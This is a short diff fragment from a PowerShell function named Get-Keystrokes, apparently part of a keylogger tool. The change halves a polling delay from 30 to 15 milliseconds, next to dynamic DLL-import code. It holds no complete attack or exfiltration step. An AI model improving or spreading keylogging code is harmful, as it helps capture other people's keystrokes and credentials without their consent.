@@ -131,7 +131,7 @@ function Get-Keystrokes {
                 $ImportDll = $TypeBuilder.CreateType()
             }
 
-            Start-Sleep -Milliseconds 30
+            Start-Sleep -Milliseconds 15
 
                 try
                 {
